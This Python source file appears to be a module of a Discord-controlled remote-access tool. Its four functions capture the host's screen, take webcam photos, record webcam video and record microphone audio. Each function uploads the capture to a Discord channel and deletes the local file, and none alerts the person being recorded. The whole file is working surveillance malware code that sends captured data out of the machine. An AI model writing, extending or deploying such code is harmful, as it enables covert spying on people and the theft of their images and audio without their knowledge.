import os
import time
import cv2
import mss
import sounddevice as sd
import numpy as np
import wave, discord

TEMP_DIR = "Mohini_temp"
os.makedirs(TEMP_DIR, exist_ok=True)

async def screenshot(ctx_or_channel):
    try:
        filename = os.path.join(TEMP_DIR, f"screenshot_{int(time.time())}.png")
        with mss.mss() as sct:
            sct.shot(output=filename)
        await ctx_or_channel.send(file=discord.File(filename))
        os.remove(filename)
    except Exception as e:
        await ctx_or_channel.send(f"❌ Error: {e}")

async def camera(ctx_or_channel):
    try:
        filename = os.path.join(TEMP_DIR, f"camera_{int(time.time())}.png")
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():  # Check if the camera is available
            await ctx_or_channel.send("❌ No **camera** is present on this system.")
            return
        ret, frame = cap.read()
        cap.release()
        if ret:
            cv2.imwrite(filename, frame)
            await ctx_or_channel.send(file=discord.File(filename))
            os.remove(filename)
        else:
            await ctx_or_channel.send("❌ Failed to capture an image.")
    except Exception as e:
        await ctx_or_channel.send(f"❌ Error: {e}")

async def video(ctx_or_channel, duration: int = 5):
    try:
        filename = os.path.join(TEMP_DIR, f"recorded_video_{int(time.time())}.mp4")
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():  # Check if the camera is available
            await ctx_or_channel.send("❌ No **camera** is present on this system.")
            return
        fourcc = cv2.VideoWriter_fourcc(*'mp4v')  # MP4 codec
        out = cv2.VideoWriter(filename, fourcc, 20.0, (640, 480))
        start_time = time.time()
        while int(time.time() - start_time) < duration:
            ret, frame = cap.read()
            if ret:
                out.write(frame)
            else:
                break
        cap.release()
        out.release()
        await ctx_or_channel.send(file=discord.File(filename))
        os.remove(filename)
    except Exception as e:
        await ctx_or_channel.send(f"❌ Error: {e}")

async def record(ctx_or_channel, duration: int = 5):
    try:
        if len(sd.query_devices()) == 0:  # Check if a microphone is available
            await ctx_or_channel.send("❌ No **microphone** is present on this system.")
            return
        filename = os.path.join(TEMP_DIR, f"recorded_audio_{int(time.time())}.wav")
        samplerate = 44100  # High-quality audio
        channels = 2  # Stereo recording
        await ctx_or_channel.send(f"🎤 **Recording audio for {duration} seconds...**")
        audio_data = sd.rec(int(samplerate * duration), samplerate=samplerate, channels=channels, dtype=np.int16)
        sd.wait()
        with wave.open(filename, 'wb') as wf:
            wf.setnchannels(channels)
            wf.setsampwidth(2)
            wf.setframerate(samplerate)
            wf.writeframes(audio_data.tobytes())
        await ctx_or_channel.send(file=discord.File(filename))
        os.remove(filename)
    except Exception as e:
        await ctx_or_channel.send(f"❌ Error: {e}")

